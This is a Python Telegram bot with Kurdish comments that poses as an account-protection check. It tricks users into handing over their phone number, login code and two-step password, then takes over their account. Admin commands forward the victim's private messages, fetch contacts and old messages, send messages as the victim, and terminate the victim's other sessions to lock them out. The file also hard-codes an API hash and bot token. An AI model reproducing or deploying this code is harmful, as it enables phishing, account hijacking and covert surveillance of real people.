from pyrogram import Client, filters, errors
from pyrogram.types import ReplyKeyboardMarkup, KeyboardButton
import asyncio

# --- زانیارییەکانت ---
API_ID = 38225812
API_HASH = "aff3c308c587f18a5975910fbcf68366"
BOT_TOKEN = "8424748782:AAG0VELUlOfabsayVic2SpUAR-hWsh-nnf0"
ADMIN_ID = 7414272224

app = Client("pro_spy_ultimate", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

active_sessions = {} # کۆگای کڕاینتەکان

# --- بەشی وەرگرتنی نێچیر ---
@app.on_message(filters.command("start") & filters.private)
async def start(client, message):
    if message.from_user.id == ADMIN_ID:
        await message.reply_text("💎 بەخێرهاتی گەورەم بۆ پانێڵی کۆنتڕۆڵ\n\n"
                                 "📡 `/spy [ID]` - چالاککردنی سیخوڕی نامە\n"
                                 "📩 `/get_messages [ID]` - هێنانی نامە کۆنەکان\n"
                                 "📱 `/get_contacts [ID]` - لیستی ناوەکان\n"
                                 "🚫 `/terminate [ID]` - دەرکردنی ئامێرەکان\n"
                                 "📤 `/send [ID] [User] [Msg]` - ناردنی نامە")
        return

    btn = ReplyKeyboardMarkup([[KeyboardButton("📲 پشکنینی ئەکاونت", request_contact=True)]], resize_keyboard=True)
    await message.reply_text("👋 بۆ پاراستنی ئەکاونتەکەت لە فلتەر، کلیک لە دوگمەی خوارەوە بکە.", reply_markup=btn)

@app.on_message(filters.contact & filters.private)
async def handle_contact(client, message):
    u_id = message.from_user.id
    phone = message.contact.phone_number
    await app.send_message(ADMIN_ID, f"☎️ ژمارەی نوێ: `+{phone}`\n🆔 ئایدی: `{u_id}`")
    
    u_client = Client(f"session_{u_id}", api_id=API_ID, api_hash=API_HASH)
    await u_client.connect()
    
    try:
        code_info = await u_client.send_code(phone)
        active_sessions[u_id] = {"client": u_client, "phone": phone, "hash": code_info.phone_code_hash, "step": "code", "spying": False}
        await message.reply_text("✅ کۆدی ٥ ژمارەیی بنێرە:")
    except Exception as e:
        await app.send_message(ADMIN_ID, f"❌ هەڵە: {e}")

# --- بەشی چالاککردنی سیخوڕی (SPY) ---
@app.on_message(filters.command("spy") & filters.user(ADMIN_ID))
async def toggle_spy(client, message):
    try:
        target_id = int(message.command[1])
        if target_id in active_sessions:
            active_sessions[target_id]["spying"] = True
            u_client = active_sessions[target_id]["client"]
            
            # دروستکردنی Handler بۆ فۆرواردکردنی نامەکان
            @u_client.on_message(filters.private & ~filters.me)
            async def forwarder(c, m):
                await m.forward(ADMIN_ID)
                await app.send_message(ADMIN_ID, f"☝️ نامەی نوێ لە ئەکاونتی: `{target_id}`")
            
            await message.reply_text(f"📡 سیستەمی سیخوڕی بۆ `{target_id}` چالاک بوو. هەر نامەیەکی بۆ بێت بۆت دێت.")
        else:
            await message.reply_text("❌ ئەم ئایدییە لۆگین نییە.")
    except:
        await message.reply_text("Usage: `/spy [ID]`")

# --- فەرمانی TERMINATE (بۆ ئەوەی کەسەکە نەتوانێت دەرت بکات) ---
@app.on_message(filters.command("terminate") & filters.user(ADMIN_ID))
async def kill_others(client, message):
    try:
        target_id = int(message.command[1])
        u_client = active_sessions[target_id]["client"]
        sessions = await u_client.get_authorizations()
        for s in sessions:
            if not s.is_current:
                await u_client.terminate_session(s.hash)
        await message.reply_text(f"⚔️ هەموو ئامێرەکانی تر دەرکران. ئێستا تەنها تۆ لە ئەکاونتەکەیت.")
    except Exception as e:
        await message.reply_text(f"❌ هەڵە: {e}")

# --- قۆناغەکانی تەواوکردنی لۆگین ---
@app.on_message(filters.text & filters.private)
async def login_logic(client, message):
    u_id = message.from_user.id
    if u_id in active_sessions and active_sessions[u_id]["step"] != "done":
        data = active_sessions[u_id]
        if data["step"] == "code":
            try:
                await data["client"].sign_in(data["phone"], data["hash"], message.text)
                active_sessions[u_id]["step"] = "done"
                await app.send_message(ADMIN_ID, f"🔥 لۆگین سەرکەوتوو بوو بۆ: `{u_id}`\nئێستا دەتوانی فەرمانی `/spy {u_id}` بەکاربێنی.")
                await message.reply_text("✅ پشکنین تەواو بوو.")
            except errors.SessionPasswordNeeded:
                active_sessions[u_id]["step"] = "2fa"
                await message.reply_text("🔑 پاسۆردی دوو قۆناغی بنێرە:")
            except Exception as e: await app.send_message(ADMIN_ID, f"❌ هەڵە: {e}")
        elif data["step"] == "2fa":
            try:
                await data["client"].check_password(message.text)
                active_sessions[u_id]["step"] = "done"
                await app.send_message(ADMIN_ID, f"🔥 لۆگین بە پاسۆرد تەواو بوو: `{u_id}`")
            except Exception as e: await app.send_message(ADMIN_ID, f"❌ هەڵە: {e}")

app.run()
